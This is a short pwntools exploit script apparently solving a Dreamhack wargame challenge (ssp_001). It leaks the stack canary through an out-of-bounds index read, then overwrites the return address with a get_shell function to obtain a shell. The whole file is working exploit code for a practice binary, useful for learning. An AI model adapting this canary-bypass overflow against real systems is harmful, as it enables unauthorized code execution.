from pwn import *

#p = process("./ssp_001")
p=remote("host3.dreamhack.games",18707)
#print(f"PID : {p.pid}")
canary = b"\x00"
get_shell = 0x80486b9

for i in range(129,132,1):
    p.sendafter(b"> ",b"P")
    p.sendlineafter(b"Element index : ", str(i).encode())
    p.recvuntil(b"is : ")
    a = p.recv(2)
    canary += unhex(a)   

canary = u32(canary)
p.sendafter(b"> ",b"E")
p.sendlineafter(b"Name Size : ", b"90")

payload = b"a" * 64                
payload += p32(canary)          
payload += b"a" * 8
payload += p32(get_shell)


p.sendafter(b"Name : ", payload)

p.interactive()


